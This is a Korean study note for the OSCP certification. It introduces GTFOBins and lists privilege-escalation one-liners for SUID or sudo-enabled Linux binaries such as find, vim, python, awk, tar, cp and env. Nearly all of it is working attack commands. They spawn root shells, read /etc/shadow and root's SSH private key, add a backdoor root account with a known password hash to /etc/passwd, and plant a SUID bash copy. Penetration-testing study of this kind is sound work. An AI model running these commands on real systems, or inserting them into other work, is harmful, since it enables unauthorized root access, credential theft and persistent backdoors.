# GTFOBins란?

**GTFOBins**는 "Get The F\*\*\* Out Binaries"의 줄임말로,
**리눅스 시스템에서 SUID(특권 있는 권한)가 설정된 실행 파일들을 악용해 권한 상승(Privilege Escalation)을 하는 방법들을 모아놓은 온라인 데이터베이스입니다.**

- 쉽게 말해,
  시스템에 있는 특정 프로그램을 "약점"으로 활용해
  일반 사용자 권한에서 **root 권한을 얻는 방법**을 모아놓은 모음집이에요.

## look - 파일 내용 읽기 권한 상승

```bash
# look 명령: 파일 내용 읽기 가능
# 특정 문자열로 시작하는 줄을 검색하는 명령어지만, 권한 상승에 활용 가능

# 1. 일반 파일 읽기 (권한 밖 파일 내용 확인)
LFILE=/etc/shadow   # 읽고 싶은 파일 지정
look '' "$LFILE"    # 빈 문자열로 검색 → 전체 내용 표시

# 2. SUID 바이너리로 권한 상승
# - SUID 설정된 look 명령어 이용
sudo install -m =xs $(which look) .  # 현재 디렉토리에 SUID 설정된 look 복제

# SUID 바이너리로 권한 있는 파일 읽기
LFILE=/etc/shadow
./look '' "$LFILE"

# 3. sudo 권한으로 실행
# - sudoers에 look 명령어 실행 권한 있는 경우
LFILE=/etc/shadow
sudo look '' "$LFILE"

# 핵심: look 명령은 파일 내용을 직접 읽기 때문에 권한 상승 가능
# 권한 상승에 유용 - 내부적으로 권한을 drop하지 않음
# /etc/shadow, /root/.ssh/id_rsa 등 중요 파일 내용 읽기 가능
```

# OSCP 출현 빈도 높은 GTFOBins 모음

## 1. find - 매우 자주 등장

```bash
# SUID로 쉘 획득
find . -exec /bin/sh -p \; -quit

# sudo로 쉘 획득
sudo find . -exec /bin/sh \; -quit

# 능력자 검증: find에서 sh 막힐 경우 대안
sudo find . -exec /bin/bash \; -quit
```

## 2. vim/vi - 매우 자주 등장

```bash
# sudo로 쉘 획득
sudo vim -c ':!/bin/bash'

# SUID로 쉘 획득
./vim -c ':!/bin/sh -p'

# 다른 방법
sudo vi
:set shell=/bin/bash
:shell
```

## 3. less/more - 자주 등장

```bash
# less로 쉘 획득
sudo less /etc/profile
!/bin/bash

# more로 쉘 획득
sudo more /etc/profile
!/bin/bash

# SUID 설정 파일 읽기
LFILE=/etc/shadow
less $LFILE
```

## 4. python/python3 - 매우 자주 등장

```bash
# sudo로 쉘 획득
sudo python -c 'import os; os.system("/bin/bash")'
sudo python3 -c 'import os; os.system("/bin/bash")'

# SUID로 쉘 획득
./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
```

## 5. perl - 종종 등장

```bash
# sudo로 쉘 획득
sudo perl -e 'exec "/bin/bash"'

# SUID로 쉘 획득
./perl -e 'exec "/bin/sh", "-p"'
```

## 6. nmap (오래된 버전) - 가끔 등장

```bash
# 옛날 버전만 해당됨 (5.2x 이하)
# 대화형 모드로 쉘 획득
sudo nmap --interactive
nmap> !sh
```

## 7. awk - 비교적 자주 등장

```bash
# sudo로 쉘 획득
sudo awk 'BEGIN {system("/bin/bash")}'

# SUID로 쉘 획득
./awk 'BEGIN {system("/bin/sh -p")}'
```

## 8. nano/pico - 자주 등장

```bash
# sudo로 에디터 열고 쉘 획득
sudo nano
^R^X (Ctrl+R 누른 후 Ctrl+X)
reset; sh 1>&0 2>&0
```

## 9. cp - 파일 복사로 권한 상승

```bash
# /etc/passwd 백업 후 수정하여 루트 사용자 추가
sudo cp /etc/passwd /tmp/passwd.backup
echo 'hacker:$1$xyz$Qqen0jaFJvN.qWG9jpHdW/:0:0:root:/root:/bin/bash' >> /tmp/passwd.new
sudo cp /tmp/passwd.new /etc/passwd
su hacker  # 암호: hacker

# SUID/SUDO 복사로 권한 있는 바이너리 생성
sudo cp /bin/bash /tmp/rootbash
sudo chmod +s /tmp/rootbash
/tmp/rootbash -p
```

## 10. tar - 자주 출현

```bash
# sudo 권한으로 쉘 실행
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/bash

# SUID 설정된 경우
./tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh -p
```

## 11. 기타 자주 발견 바이너리

### 11-1. sed

```bash
# sudo로 쉘 획득
sudo sed -n '1e /bin/bash' /etc/hosts
```

### 11-2. man

```bash
# sudo로 man 페이지 열고 쉘 획득
sudo man ls
!/bin/bash
```

### 11-3. 언어 인터프리터(php, ruby 등)

```bash
# PHP로 쉘 획득
sudo php -r "system('/bin/bash');"

# Ruby로 쉘 획득
sudo ruby -e 'exec "/bin/bash"'
```

### 11-4. 텍스트 편집기(emacs, gedit 등)

```bash
# 텍스트 편집기 권한으로 쉘 실행
sudo emacs -Q -nw --eval '(term "/bin/bash")'
```

### 11-5. env - 종종 등장

```bash
# sudo 권한으로 쉘 실행
sudo env /bin/bash
```

## OSCP 실전 팁

1. 먼저 SUID 바이너리 찾기:

```bash
find / -perm -4000 -type f 2>/dev/null
```

2. sudo 권한 확인:

```bash
sudo -l
```

3. 의심스러운 바이너리 발견 시 GTFOBins 확인:

   - https://gtfobins.github.io/ 참고 (시험 환경에서는 접근 불가)
   - 이 파일에 없는 바이너리는 `strings`, `strace` 등으로 분석

4. 최신 GTFOBins 내용은 자주 변경되므로 사전 학습 필요
